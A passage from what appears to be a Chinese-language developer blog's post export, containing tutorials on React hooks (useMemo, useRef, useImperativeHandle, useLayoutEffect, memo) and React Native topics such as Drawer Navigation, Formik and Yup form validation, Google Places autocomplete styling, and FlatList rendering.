簡單來說，可以把複雜的計算放在 useMemo 裡面來做，然後一樣給它 dependencies，告訴它什麼東西改變時在重新計算就好，這樣就能省下不必要的計算： 123456789101112131415161718192021222324function App() { const [value, setValue] = useState(\"\"); // 每次 re-render 都會被執行 const veryComplexCalculate = () =&gt; { console.log('calculate') return 1 + 1 } // 只有 dependencies 改變時才執行 const veryComplexCalculateByMemo = useMemo(() =&gt; { console.log('memo') return 100 + 100 }, []) return ( &lt;div className=\"App\"&gt; &lt;div&gt;Result1: {veryComplexCalculate()}&lt;/div&gt; &lt;div&gt;Result2: {veryComplexCalculateByMemo}&lt;/div&gt; &lt;input value={value} onChange={(e) =&gt; setValue(e.target.value)} /&gt; &lt;/div&gt; );} 一樣可以到我寫 範例 參考（記得打開 console） useRef 一個 Mutable 的值，只有你自己去改它時它才會變，而且不會觸發 re-render 附註：不會變的原理是因為 React 在背後幫你做了一些事情，讓每次 re-render 都會是同一個 Object 的 reference。 上面的說法沒有很完整，但我覺得這樣講會好記一點，一樣來看個範例吧： 12345678910111213141516function App() { const [randomValue, serRandomValue] = useState(0); // {current: 0} const counter = useRef(0) // 用來觸發 re-render const changeValue = () =&gt; serRandomValue(Math.random()) return ( &lt;div className=\"App\"&gt; &lt;div&gt;Ref: {counter.current}&lt;/div&gt; // 因為是 Mutable 所以能直接改 &lt;button onClick={() =&gt; counter.current++}&gt;add 1 to ref&lt;/button&gt; &lt;button onClick={changeValue}&gt;Re-render&lt;/button&gt; &lt;/div&gt; );} 首先 useRef 會建立一個物件，它會有一個 current 屬性，用來儲存你給的初始值。所以你要存取東西都要用 .current 來取，不然會拿到整個物件。 它最大的特點就是「Mutable」，所以你可以直接改，不用像改 state 一樣還要先 copy 一份新的才行。 這邊一樣有寫 範例 來練習，可以參考看看。 除了上面這個範例，它還有一個很常會拿來用的地方：「儲存 DOM 元素」 123456789101112131415161718192021function App() { const [flag, setFlag] = useState(true); // {current: null} const inputRef = useRef(null) useEffect(() =&gt; { // 每次 render 完如果有抓到 input 就 focus if (inputRef.current) { inputRef.current.focus(); } }); return ( &lt;div className=\"App\"&gt; // 把 input 節點存到 useRef 裡 { flag &amp;&amp; &lt;input ref={inputRef} /&gt;} // 點按鈕可以把 input 隱藏 or 顯示 &lt;button onClick={() =&gt; setFlag(prev =&gt; !prev)}&gt;Toggle&lt;/button&gt; &lt;/div&gt; );} 這邊的範例可以到 這邊 試。 總之這背後的原理是，只要把一個物件放在 ref 屬性上，React 就會自動幫你把 DOM 元素放到 current 裡，但一般還是建議用 useRef 來存比較好。 useImperativeHandle useRef 的延伸 這個應該不太會用到，只要大概知道一下就好了。 這個是用在如果我把一個 Component 拆到最小單位，像是只有一個 &lt;input&gt;，那我有沒有辦法在在父元件去控制它？聽起來有點莫名奇妙吧？所以來直接看範例吧： 12345678910111213141516171819202122// 我想操控的那個 inputimport Myinput from \"./Myinput\";function App() { // 一樣要透過 useRef 來儲存 DOM const inputRef = useRef(null); const focusInput = () =&gt; { // 這邊待會在解釋，你只要知道這邊的意思是用來 focus 就好了 inputRef.current.yoyoyo(); } return ( &lt;div className=\"App\"&gt; // 把這個 Component 存到 useRef &lt;Myinput ref={inputRef} /&gt; &lt;button onClick={focusInput}&gt;focus&lt;/button&gt; &lt;/div&gt; );}export default App; 簡單來說，&lt;Myinput /&gt; 在建立的時候可以決定要 export 哪些「method」來給父元件用，這邊是 yoyoyo。名字是我故意亂取的所以看起來很詭異，但我只是想讓你知道它是可以自定義的，不用一定要 focus。 接著來看一下子元件的部分吧： 123456789101112131415161718192021import { useRef, useImperativeHandle, forwardRef } from \"react\"function MyInput (props, ref) { const inputRef = useRef(null); useImperativeHandle(ref, () =&gt; { // export 一個 yoyoyo，它可以 focus 到這個 input return { yoyoyo: () =&gt; inputRef.current.focus() } }) return ( &lt;input type=\"text\" placeholder=\"type some thing...\" ref={inputRef} /&gt; )}export default forwardRef(MyInput) 簡單來說，這邊你要做三件事情： 把 DOM 元素用 useRef 儲存 設定 useImperativeHandle，把要 export 出去的東西寫好 最後用 forwardRef 包起來 就這樣囉，想看範例可以到 這邊 useLayoutEffect這個也跟課程講的一樣： render 完以後，瀏覽器 paint 完後想做什麼 它跟 useEffect 基本上是一樣的東西，只差在「觸發的時機」不同，一個是在畫面 paint 完以後執行，一個在 paint 之前。 這邊的示範有點難做，不確定是不是 18.0 有做一些優化，不能做出「閃一下」的效果，有興趣的話可以參考 這篇，裡面有示範什麼是「閃一下」。 或你也可以參考我寫的另一種 範例： 123456789101112131415161718192021222324import { useState, useEffect, useLayoutEffect } from \"react\";function App() { const [todos, setTodos] = useState([\"todo1\", \"todo2\", \"todo3\"]); // 如果是 useLayoutEffect 畫面就會等 3 秒後才 paint 出來 // 如果是 useEffect 畫面會直接顯示，不會受到影響 useLayoutEffect(() =&gt; { const target = new Date().getTime() + 3000; // 等三秒 while (new Date().getTime() &lt; target) {} console.log(\"finish\"); }, []); return ( &lt;div className=\"App\"&gt; &lt;ul&gt; {todos.map((todo) =&gt; ( &lt;li&gt;{todo}&lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; );} 總之你只要知道這兩個觸發的「時機點」是不一樣的就好了。另外一般會建議能用 useEffect 就用它，少用 useLayoutEffect。","link":"/2022/04/20/react-hooks-review/"},{"title":"React 當初始值是 API 的資料怎麼辦？","text":"要慢慢習慣這個 pattern。 簡述我原本的想法是用 useState 的 Lazy Initializers 來載入： 12345useState(async () =&gt; { const res = await fetch(...); const json = await res.json(); return json}) 不過這樣是行不通的，把「非同步」的東西放在這裡 React 是不會等 response 回來的。 比較常見的慣例是用 useEffect 來發 API，接著再更新 state： 123456789101112131415// 把初始值改成空陣列const [ comments, setComments ] = useState([]);// 拿到 API 以後再更新 stateuseEffect(() =&gt; { async function fetchComments() { try { const res = await fetch(API_ENDPOINT); const json = await res.json(); setComments(json); } catch (err) { setApiError(err); } } fetchComments();}, []) 雖然這樣等於說： render useEffect 發 API 拿資料 更新 state，re-render 第一次的 render 顯得有點浪費，不過目前想不到什麼其他的解法，可能這就是寫 React 的 pattern 吧","link":"/2022/04/10/react-how-to-set-init-value/"},{"title":"在 React 引入圖片的方式","text":"第一次玩這招，很酷。 簡述其實很直覺，畢竟 Webpack 很強大： 1234import avatar from \"../../assets/PeaNu.jpg\"// 就可以直接引入了&lt;MessageAvatar src={avatar}&gt;&lt;/MessageAvatar&gt;","link":"/2022/04/10/react-import-img/"},{"title":"在 React 使用全屏 Loading 效果","text":"到哪都會用到的 Loading。 簡述1. 先下載套件 來源：https://www.npmjs.com/package/react-loading-overlay#styles-with-emotion 1npm install react-loading-overlay 2. 用 styled component 撰寫全屏樣式 附 code 之前先解釋一下邏輯，LoadingOverlay 預設的 HTML 結構長這樣： div.wrapper 容器 div.overlay 載入畫面 這裡設定的東西是「容器」，因為希望有全屏效果，所以使用 fixed 來做： 1234567const StyledLoader = styled(LoadingOverlay)` position: fixed; top: 0; right: 0; bottom: 0; left: 0;`; 3. 把改好的 Component 放上去 1234567891011121314function App () { retrun ( {isLoading &amp;&amp; ( &lt;StyledLoader active={isLoading} spinner={true} text=\"Loading your content...\" &gt;&lt;/StyledLoader&gt; )} &lt;Component1 /&gt; &lt;Component2 /&gt; &lt;Component3 /&gt; )} 補充：之所以要用 &amp;&amp; 條件渲染是因為 LoadingOverlay 關閉時並不會把 div.wrapper 移除，而 div.wrapper 又正好放在最頂層，等於說會蓋在所有元素之上，沒辦法做任何操作。 所以才得加上條件渲染的方式來解決這個問題，不過要注意用這種方式的話 fade 的效果就會消失。 如果不想這麼麻煩的話，可以把 CSS 改成這樣： 12345678910const StyledLoader = styled(LoadingOverlay)` // 選到下面的 div.overlay &amp; &gt; ._loading_overlay_overlay { position: fixed; top: 0; right: 0; bottom: 0; left: 0; }`; 這樣就完成囉～ 附註雖然照上面的作法應該就沒問題了，但應該會一直出現 Warning 訊息，像這樣： 簡單來說應該是 styles 的 propType 不正確的關係，但我就沒有要傳 styleds 啊！ 所以後來找到 這篇 的 issue，但作者似乎都不回應了，所以只好這樣子解： 12import LoadingOverlay from 'react-loading-overlay';LoadingOverlay.propTypes = undefined; 或者也可以用別人修正過後的 套件 來試試看。","link":"/2022/04/10/react-loading-overlay/"},{"title":"React 的第五個 hook：memo","text":"跟效能有關的 hook 之一。 簡述 把 Component 給記起來，如果 props 沒有變就不會 re-render 一般在父元件的 state 改變時，會連帶底下的所有子元件 re-render，可是有些時候不需要阿，子元件根本就沒改到什麼內容，幹嘛 re-render？ 這時候就可以用 memo，來對子元件做一層包裝，讓它只有在 props 改變時才會跟著 re-render 這邊寫了一個簡單的例子： 12345678910111213141516171819202122232425262728// 一般的 componentconst NormalComponent = ({ who }) =&gt; { // 計數器 let counter = useRef(0) // 每次 re-render 就遞增 counter.current++ return ( &lt;div&gt; {who} 已經被 render 了 {counter.current} 次 &lt;/div&gt; )}// 用了 memo 的 componentconst MemoComponent = memo(NormalComponent)function App() { const [value, setValue] = useState() const handleChange = (e) =&gt; setValue(e.target.value) return ( &lt;div className='app'&gt; &lt;input type='text' value={value} onChange={handleChange} /&gt; &lt;NormalComponent content='一般的 Component' /&gt; &lt;MemoComponent content='Memo 後的 Component' /&gt; &lt;/div&gt; )} NormalComponent 因為沒有用 memo 包裝，所以每次父元件 re-render 時都會連帶影響，而 MemoComponent 有用 memo 包裝，並且它的 props（content） 在 re-render 時並沒有改變，所以不會被重新渲染。 可是要特別注意，當 props 是 Object 的時候，結果可能就會出乎你預料： 123456789101112131415function App() { const [value, setValue] = useState() const handleChange = (e) =&gt; setValue(e.target.value) // 一個要當作 props 的 function const handleSomething = () =&gt; {} return ( &lt;div className='app'&gt; &lt;input type='text' value={value} onChange={handleChange} /&gt; {/* 傳進去 */} &lt;NormalComponent content='一般的 Component' someObject={handleSomething} /&gt; &lt;MemoComponent content='Memo 後的 Component' someObject={handleSomething} /&gt; &lt;/div&gt; )} 多傳一個 function 進去後 memo 就沒效了！ 這時候就要回憶一下變數「存值」跟「存址」的差別了，可以複習去這篇 從 Object 的等號來真正理解變數。 總之呢，只要不是 Primitive 型態的變數，它存的都是 reference。所以每次 re-render 的時候都重新宣告了 handleSometing 這個 function，react 在跟上一個 function 比對時就會把這兩個 function 當作是不一樣的東西，可以想成這樣： 123const handleSomething1 = () =&gt; {}const handleSomething2 = () =&gt; {}console.log(handleSomething1 === handleSomething2) // false 但如果是 Primitive 的變數就不會有這個問題，因為： 123console.log(2 === 2) // trueconsole.log('2' === '2') // trueconsole.log(true === true) // true 總之，想用 memo 前得先確認 props 是屬於哪種資料型態，如果是 non-primitive 的話單靠 memo 這個方式是沒用的，得做一些額外處理才行。 第一種解法是在 memo 的第二個參數傳入 function 來自訂比較 props 的方式，第二種方式是改用改用 useCallback。 這邊會建議用 useCallback 來處理比較好。 可以參考：React 的第六個 hook：useCallback","link":"/2022/04/07/react-memo/"},{"title":"React Native 中的 Component 與 API","text":"第一步都是從這裡開始。 官方文件怎麼看？這篇絕對不會把所有東西帶過一遍，所以你要知道當你需要某個功能時，你該到哪裡去找資料。 舉例來說，以 這份文件 來看的話，你可以從這幾個方向來找： Core Components 跟 UI 有關的跨平台元件 Andriod Components 只能用在 Android IOS Components 只能用在 IOS 另一個的話則是跟 Native 做溝通的相關 API，可以參考這份，如果沒有特別標注 Android 或 IOS 的話就是跨平台。 Component &lt;View&gt; 就跟 HTML 中的 div 很像，可以用來群組一個區塊 &lt;SafeAreaView&gt; 可以解決 IOS 的瀏海擋住的問題 &lt;Text&gt; 跟文字有關的東西一定要放在這裡面 &lt;Button /&gt; 可以產生原生的按鈕（注意是 Self-Closing Tag） &lt;TextInput /&gt; 輸入框 onChangeText 可取得輸入值 multiline 可輸入多行 placeholder 能放佔位文字 keyboardType 可以設定輸入框的類型（例如：numberic） &lt;ScrollView&gt; 用這個包住後才會顯示滾軸，不然會被截斷 &lt;Image /&gt; 可以放圖片，透過 require 的方式引入 &lt;Modal /&gt; 可以彈出互動視窗，加上 animationType=\"slide\" 質感會上升一倍 &lt;ImageBackground /&gt; 可以放背景圖片，一樣透過 require 來引入 &lt;TouchableHighlight&gt; 點擊效果，必須搭配 onPress 才看得出來 &lt;TouchableOpacity 點擊效果，但可以不搭配 onPress &lt;TouchableWithoutFeedback&gt; 可以用在需要點擊，但不需要反饋的事情上，例如：關閉小鍵盤 &lt;FlatList /&gt; 用來渲染列表（延遲載入） 補充：引入外部圖片的方法第一種是這樣： 1234&lt;Image source={{ uri: 'https://picsum.photos/300/300', width: 100, height: 100 }} /&gt; 第二種是這樣： 123456789&lt;Image style={styles.img} source={{ uri: 'https://picsum.photos/300/300' } /&gt;const styles = StyleSheet.create({ img: { width: 100, height: 100 }}); 不管是哪一種，都一定要記得指定寬跟高，這樣圖片才顯示的出來。 至於引入 asset 中的圖片不需要加的原因，是因為在打包的時候就會知道 meta 資訊，這是跟外部圖片不同的地方。 API Platform 可以用來檢查使用 IOS / Android StatusBar 跟上方列相關的東西，例如 StatusBar.currentHeight 能取得裝置的上方列高度（Android） Dimensions.get('screen') 可以用來檢查裝置的寬高資訊，window 是 viewport，screen 是整個裝置（但在 IOS 上似乎是沒差） Keyboard 可以做對鍵盤有關的操作，例如：Keyboard.dismiss() 可以關掉鍵盤 補充：一個不錯用的套件@react-native-community/hooks 這個套件有提供一些不錯的 hook： useDimensions() 顯示目前方向的寬高 useDeviceOrientation() 顯示目前的方向 補充：關於 IOS 中的 keyboard在預設的情況下 IOS 使用 ，&lt;TextInput /&gt; 時不會自動彈出 keyboard，如果希望打開這功能，請這樣做： I/O &gt; Keyboard &gt; Connect Hardware Keyboard I/O &gt; Input &gt; Send Keyboard Input to Device 第一步是要把手機的小鍵盤打開，第二步是讓你能用電腦的鍵盤來輸入內容。","link":"/2022/05/26/react-native-components-and-api/"},{"title":"React Navigation－Drawer Navigation","text":"再來一個經典的導覽列。 自我檢測 我知道怎麼透過客製化元件來當作 NabBar 我知道怎麼把 Drawer 跟 Stack 結合起來用 我知道怎麼透過 options 來傳遞 props 給自定義元件 關於背後的設計理念在不考慮太多的情況下，假設你想做的效果是這樣： 有一個側邊導覽列，可以進入 Home 跟 About （順道一提，這個可以拉出來的東西就叫做「Drawer Navigation」，也是我們等一下要實作的東西。） 接著，Home 裡面又可以進入到其他頁面，像這樣： 而 About 的話就只是一個普通的頁面： 你可以先想想看，你會怎麼來實作這樣的東西？ 會特別提這個的原因是，其實 Home 跟 About 這兩個頁面其實都是 Stack Navigation。 你可能會想說幹嘛不直接拿 About 來用就好，還要包成一個 Stack？回答這問題之前，不如直接來試試看，看結果會怎麼樣： 看到了吧，上面那條 NavBar 消失了，這個就是為什麼都還要包成 Stack 的原因： 就算只有一個頁面，我也希望他有上面的 NavBar 所以你才會看到很多人設計路由時都是這樣子： 總之希望這邊可以幫你解惑一點，因為等一下的範例也會用這種方式來實作。 需要裝的套件我假設你目前已經有這些套件，沒有的話請順便裝起來： @react-navigation/native (npm) 核心 @react-navigation/native-stack (npm) 建立 Stack 需要 react-native-screens (expo) 給 Expo 用的 react-native-safe-area-context (expo) 給 Expo 用的 接著是使用 Drawer Navigation 會用到的套件： @react-navigation/drawer (npm) 核心 react-native-gesture-handler (expo) 給 Expo 用的 react-native-reanimated (expo) 給 Expo 用的 動工吧！這邊會延續 React Navigation－Navigation Stack 的概念來繼續往下做。目標是一開始展示的那種效果，所以就直接開始吧！ 首先我們會有三個頁面，分別為： Home Detail About 最開始的時候有說過，為了讓每個頁面都有 NavBar，所以會拆成兩個 Stack，分別是： HomeStack AboutStack 如果你忘記的話可以拉回去上面看一下藍圖，總之 Drawer Navigation 的任務就是負責顯示這兩個不同的 Stack！ 所以第一步就是先建立好 Stack，這邊的東西你應該要看得懂，所以就不特別解釋了 1234567891011121314151617181920212223242526// HomeStack.tsximport { createNativeStackNavigator } from \"@react-navigation/native-stack\";import HomeScreen from \"../screens/Home\";import DetailScreen from \"../screens/Detail\";const Stack = createNativeStackNavigator();const HomeStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerBackTitle: 'Back', headerTintColor: '#fff', headerStyle: { backgroundColor: 'dodgerblue' }, headerTitleStyle: { fontSize: 20 } }}&gt; &lt;Stack.Screen name=\"Home\" component={HomeScreen} /&gt; &lt;Stack.Screen name=\"Detail\" component={DetailScreen} /&gt; &lt;/Stack.Navigator&gt; )}export default HomeStack; 1234567891011121314151617181920// About.tsximport { createNativeStackNavigator } from \"@react-navigation/native-stack\";import AboutScreen from \"../screens/About\";const Stack = createNativeStackNavigator();const AboutStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerTintColor: 'white', headerStyle: { backgroundColor: 'dodgerblue' } }}&gt; &lt;Stack.Screen name=\"About\" component={AboutScreen} /&gt; &lt;/Stack.Navigator&gt; )}export default AboutStack; 到這邊 Stack 的部分就完成了，接下來是 Drawer 的部分。 但說實話，等一下要做的東西基本上就跟在做 Stack 時有 87 分像，你直接看 code 大概就能抓到那個 pattern 了： 12345678910111213141516171819202122import { createDrawerNavigator } from \"@react-navigation/drawer\";const Drawer = createDrawerNavigator();// 把兩個 stack 拿進來來import HomeStack from \"./HomeStack\";import AboutStack from \"./AboutStack\";const DrawerNavigator: React.FC = () =&gt; { return ( // 把 Drawer 自帶的 NavBar 隱藏 &lt;Drawer.Navigator screenOptions={{ headerShown: false }}&gt; // 如果沒有指定 options，預設會用顯示 name 的文字 ，所以才要重新指定 &lt;Drawer.Screen name=\"HomeStack\" component={HomeStack} options={{ title: 'Home' }} /&gt; &lt;Drawer.Screen name=\"AboutStack\" component={AboutStack} options={{ title: 'About' }} /&gt; &lt;/Drawer.Navigator&gt; )}export default DrawerNavigator; 這邊解釋一下 screenOptions 的部分。 如果沒有設定 headerShown: false，預設會顯示另一個 NavBar 像這樣： 至於 title 的部分就如同註解裡所說的，這部分就不再貼圖片了。 總之，做到這邊以後基本的 Drawer Navigation 就完成了。 還沒完，這時候你可能會碰到的 bug把剛剛寫的 code 拿去執行後，你有可能會得到這個錯誤訊息： Error: Reanimated 2 failed to create a worklet, maybe you forgot to add Reanimated’s babel plugin? 這邊爬了一段時間才找到解法，是參考 這篇 來解的。 簡單來說是跟 babel 有關的問題，詳細參考 官方文件 的說明，但總之呢，請先安裝這個東西： 1expo install react-native-reanimated 接著去設定 babel.config.js： 12345678module.exports = function(api) { api.cache(true); return { presets: ['babel-preset-expo'], // 加上這行 plugins: ['react-native-reanimated/plugin'], };}; 接著用清除快取的方式來重啟 Expo： 1expo start --clear 沒意外的話就能解決囉！ 加上客製化的 Header！先複習一下，在剛剛解完 bug 以後，你應該就會有這樣的效果： 看起來似乎還挺順利的，但必須老實説的是，如果沒有特別介紹的話一般人根本不知道有這個功能吧？畢竟一點提示都沒有RRRRR！ 所以接下來我們要做的就是把他改成這樣子： 這邊我只會講個大概，不會講太細，因為用文字敘述的話有點麻煩。如果真的想要 Step-By-Step 的話，可以參考這個影片。 簡單來說，我們可以客製化一個元件，再把他透過 options 的方式放到 Screen 中（就像透過 title 來改變顯示文字一樣）。 附註：如果你後來發現有寬高無法填滿的問題的話，建議改用 header 來設定 所以我們要客制的元件內容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import { View, Text, StyleSheet, TouchableOpacity, StatusBar } from \"react-native\";import { MaterialIcons } from '@expo/vector-icons';// 等會兒會再解釋這兩個 props 是怎麼拿到的interface Props { navigation: any, title: string}const Header: React.FC&lt;Props&gt; = ({ navigation, title }) =&gt; { const openMenu = () =&gt; { navigation.openDrawer(); } return ( &lt;View style={styles.container}&gt; &lt;TouchableOpacity style={styles.icon} onPress={openMenu} &gt; {/* 漢堡 */} &lt;MaterialIcons name=\"menu\" size={32} color='#fff' /&gt; &lt;/TouchableOpacity&gt; &lt;View&gt; {/* title */} &lt;Text style={styles.text}&gt;{title}&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; )}const styles = StyleSheet.create({ container: { width: '100%', height: '100%', flexDirection: 'row', justifyContent: 'center', alignItems: 'center', }, text: { color: '#fff', fontSize: 20, fontWeight: 'bold' }, icon: { position: 'absolute', left: 16 }})export default Header; 這邊我想特別講地方的只有一個，就是 container 的設定。 之所以會把寬高設為 100%，是因為我們這個元件「會放在 Navbar 裡面」，所以會有「父子階層」的意思，所以這時候的 % 就會以 NavBar 來做計算。 不用想得太複雜，我們要的就是讓他填滿原本 NavBar 的寬跟高而已。 接著來看怎麼把他放到 options 中，不過要注意一件事情，我們要放的地方只會有兩個，一個是 Home，一個是 About。 為什麼 Detail 不用放？因為我們希望它保留原本的樣子，讓他保留那個 &lt;back 的按鈕，所以它的部分不用做額外調整。 1234567891011121314151617181920212223242526import { createNativeStackNavigator } from \"@react-navigation/native-stack\";import AboutScreen from \"../screens/About\";// 剛剛寫好的 Headerimport Header from \"../share/Header\";const Stack = createNativeStackNavigator();const AboutStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerTintColor: 'white', headerStyle: { backgroundColor: 'dodgerblue' } }}&gt; {/* 放到 options 中 */} &lt;Stack.Screen name=\"About\" component={AboutScreen} options={({ navigation }) =&gt; { return { headerTitle: () =&gt; &lt;Header navigation={navigation} title=\"About GameZone\" /&gt; } }}/&gt; &lt;/Stack.Navigator&gt; )}export default AboutStack; 這邊可以注意到兩個地方： options 傳的是一個 function 在 headerTitle 中傳的也是一個 function 先解釋第一個，這樣寫是因為我們想把 navigation 當作 props 傳入 &lt;Header /&gt;，所以才得這樣寫。 至於第二點是因為我們想要用客製元件來當作內容，所以一樣得透過 function 的方式來回傳 JSX。 以上，做到這邊後你就有一個比較優的 Drawer Navigation 囉！","link":"/2022/05/29/react-native-drawer-navigation/"},{"title":"React Native－用 Formik 和 Yup 做表單驗證","text":"很常見的功能。 懶人包Formik 的部分 設定欄位的初始值 建立表單元件 把表單元件跟 formik 做資料雙向綁定 設定 submit 的 handler Yup 的部分其實就是建立一個 object，像這樣： 12345const formSchema = Yup.object({ '欄位1': 規則1, '欄位2': 規則2, '欄位3': 規則3,}) 規則的邏輯跟 propTypes 有點像，總之寫好後再跟 Formik 串起來就好了。 示範 Formik簡單來說會建立一個 Formik 的元件，只要把東西寫在 Formik 在這個元件裡，就可以利用它提供的 props 來做到下面這些事情： 設定欄位初始值 管理欄位的 state 用 Formik 的 action，例如 Reset 欄位的值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import { View, TextInput, Text, Button } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";import { Formik } from \"formik\";interface Props { addReview: any}const ReviewForm: React.FC&lt;Props&gt; = ({ addReview }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Formik initialValues={{ title: '', body: '', rating: '', }} onSubmit={(values, action) =&gt; { // 這邊可以拿到欄位的值 addReview(values); // Formik 提供的 API action.resetForm(); }} &gt; {/* 這邊是 render function，可以拿到 Formik 提供的 props， */} {(props) =&gt; ( &lt;View&gt; &lt;TextInput style={globalStyles.input} placeholder=\"Review titile\" onChangeText={props.handleChange('title')} value={props.values.title} /&gt; &lt;TextInput style={globalStyles.input} multiline placeholder=\"Review content\" onChangeText={props.handleChange('body')} value={props.values.body} /&gt; &lt;TextInput style={globalStyles.input} keyboardType=\"numeric\" placeholder=\"Rating (1, 5)\" onChangeText={props.handleChange('rating')} value={props.values.rating} /&gt; &lt;Button title=\"Submit\" onPress={props.handleSubmit} /&gt; &lt;/View&gt; )} &lt;/Formik&gt; &lt;/View&gt; )}export default ReviewForm; 示範把 Yup 跟 Formik 串起來123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import { View, TextInput, Text } from \"react-native\";import { Button } from \"../share/Button\"; import { globalStyles } from \"../style/globalStyle\";import { Formik } from \"formik\";import * as Yup from \"yup\";interface Props { addReview: any}const reviewSchema = Yup.object({ title: Yup.string() .required() .min(4, 'Too short! It\\'s must be greater than 4 charactor'), body: Yup.string() .required() .min(8, 'Too short! It\\'s must be greater than 8 charactor'), rating: Yup.string() .required() .test('is num between 1 - 5', 'Rating must be a number 1 - 5', (val: any) =&gt; { return parseInt(val, 10) &gt; 0 &amp;&amp; parseInt(val, 10) &lt; 6 })})const ReviewForm: React.FC&lt;Props&gt; = ({ addReview }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Formik initialValues={{ title: '', body: '', rating: '', }} // 把規則傳入 props validationSchema={reviewSchema} onSubmit={(values, action) =&gt; { addReview(values); action.resetForm(); }} &gt; {(props) =&gt; ( &lt;View&gt; &lt;TextInput style={globalStyles.input} placeholder=\"Review titile\" onChangeText={props.handleChange('title')} onBlur={props.handleBlur('title')} value={props.values.title} /&gt; {/* Error Message */} &lt;Text style={globalStyles.errorText}&gt;{props.touched.title &amp;&amp; props.errors.title}&lt;/Text&gt; &lt;TextInput style={globalStyles.input} multiline placeholder=\"Review content\" onChangeText={props.handleChange('body')} onBlur={props.handleBlur('body')} value={props.values.body} /&gt; &lt;Text style={globalStyles.errorText}&gt;{props.touched.body &amp;&amp; props.errors.body}&lt;/Text&gt; &lt;TextInput style={globalStyles.input} keyboardType=\"numeric\" placeholder=\"Rating (1, 5)\" onChangeText={props.handleChange('rating')} onBlur={props.handleBlur('rating')} value={props.values.rating} /&gt; &lt;Text style={globalStyles.errorText}&gt;{props.touched.rating &amp;&amp; props.errors.rating}&lt;/Text&gt; &lt;Button title=\"Submit\" onPress={props.handleSubmit} /&gt; &lt;/View&gt; )} &lt;/Formik&gt; &lt;/View&gt; )}export default ReviewForm; 附註：props.touched.title 是為了做出「碰過以後」才顯示 error message，不然全部的欄位會一次 pop 出來。 最後附上一下完成效果：","link":"/2022/06/02/react-native-formik-and-yup/"},{"title":"React Native－關於 Goole places autocomplete 的樣式","text":"套件懶人包。 簡述在寫 React Native 時用了 react-native-google-places-autocomplete 這個套件，在設定 style 時碰到了一點障礙，所以就寫了這篇來解惑。 style 結構首先結構可以想成是這樣，會比較好分析該怎麼寫 style： 1234567const GooglePlacesAutocomplete = () =&gt; ( &lt;Container&gt; &lt;TextInputContainer&gt; &lt;TextInput /&gt; &lt;/TextInputContainer&gt; &lt;/Container&gt;) 用圖來表示的話會像這樣： 這是預設的 style： 1234567891011121314151617{ container: { flex: 1, }, textInputContainer: { flexDirection: 'row', }, textInput: { backgroundColor: '#FFFFFF', height: 44, borderRadius: 5, paddingVertical: 5, paddingHorizontal: 10, fontSize: 15, flex: 1, },} 這邊解釋幾個東西： 1. Container 為什麼要設成 flex: 1？ 為了讓「搜尋結果」的空間可以展開（藍色區塊）： 2. 如果要加 icon 的話怎麼加？ 可以用 renderLeftButton 來做，至於要設定排版的話，要注意是寫在 textInputContainer，而不是 container。 像這樣： 1234567891011121314151617181920212223242526272829export default function SearchBar () { return ( &lt;View style={{ marginTop: 15, flexDirection: 'row' }}&gt; &lt;GooglePlacesAutocomplete styles={{ container: { backgroundColor: 'dodgerblue' }, textInputContainer: { flexDirection: 'row', alignItems: 'center', // 次軸置中 backgroundColor: 'orange', marginRight: 10, }, textInput: { backgroundColor: 'grey', borderRadius: 50, }, }} // 左邊的 icon renderLeftButton={() =&gt; ( &lt;View&gt; &lt;MaterialIcons name=\"location-on\" size={24} color=\"black\" /&gt; &lt;/View&gt; )} /&gt; &lt;/View&gt; )}","link":"/2022/06/03/react-native-google-places-autocomplete-style/"},{"title":"React Native 關於渲染列表的幾種方式","text":"還蠻酷炫的玩法。 map透過 map()，只要妳寫過 React 都一定會用的方法： 123456789101112131415161718192021222324252627export default function App() { const [people, setPeople] = useState([ { name: 'PeaNu', key: 1}, { name: 'PPB', key: 2}, { name: 'Jacky', key: 3}, { name: 'Dantin', key: 4}, { name: 'Stachy', key: 5}, { name: 'Altin', key: 6}, { name: 'Alex', key: 7}, { name: 'Barbur', key: 8}, { name: 'Candy', key: 9}, { name: 'Coco', key: 10}, ]) return ( &lt;View style={styles.container}&gt; &lt;ScrollView&gt; {people.map(item =&gt; ( &lt;View key={item.key} style={styles.item}&gt; &lt;Text style={styles.itemText}&gt;{item.name}&lt;/Text&gt; &lt;/View&gt; ))} &lt;/ScrollView&gt; &lt;/View&gt; );} FlasList第二種做法是用一個叫做 FlatList 的元件，先來看他的用法： 123456789101112131415161718192021222324252627282930import { FlatList } from \"react-native\"export default function App() { const [people, setPeople] = useState([ { name: 'PeaNu', key: 1}, { name: 'PPB', key: 2}, { name: 'Jacky', key: 3}, { name: 'Dantin', key: 4}, { name: 'Stachy', key: 5}, { name: 'Altin', key: 6}, { name: 'Alex', key: 7}, { name: 'Barbur', key: 8}, { name: 'Candy', key: 9}, { name: 'Coco', key: 10}, ]) return ( &lt;View style={styles.container}&gt; &lt;FlatList data={people} renderItem={({ item }) =&gt; ( &lt;View style={styles.item}&gt; &lt;Text style={styles.itemText}&gt;{item.name}&lt;/Text&gt; &lt;/View&gt; )} /&gt; &lt;/View&gt; );} 簡單來說就是傳 data 跟 renderItem 這兩個 props 給他，一個要放資料，一個要放渲染函式。 特別解釋ㄧ下渲染函式的部分，這裡會拿到的參數是一個 Object，但我們真正需要的是裡面的 item 屬性。因為這個才是我們真正丟進去的資料，所以才會用「解構」的方式拿出來。 另外透過 FlatList 渲染的列表不需要在 JSX 中加上 key，只要確保資料中有 key 就好了。（如果你沒辦法確保有 key 這個值，參考下面的 props） 除此之外 FlatList 還有個最大的特點是「Lazy Loading（延遲載入」。 意思就是如果我的資料有一大包，用 map 的話會等所有資料都載入完以後才顯示畫面，但 FlatList 的話只會載入目前畫面中所需的資料，這就是這兩者最大的差別。 順便介紹幾個 FlatList 不錯用的 props： keyExtractor 指定要用資料中的哪個值當作 key（當資料裡沒有 key 時必用） numColumns 可以指定要渲染成幾欄（偶數 Only） 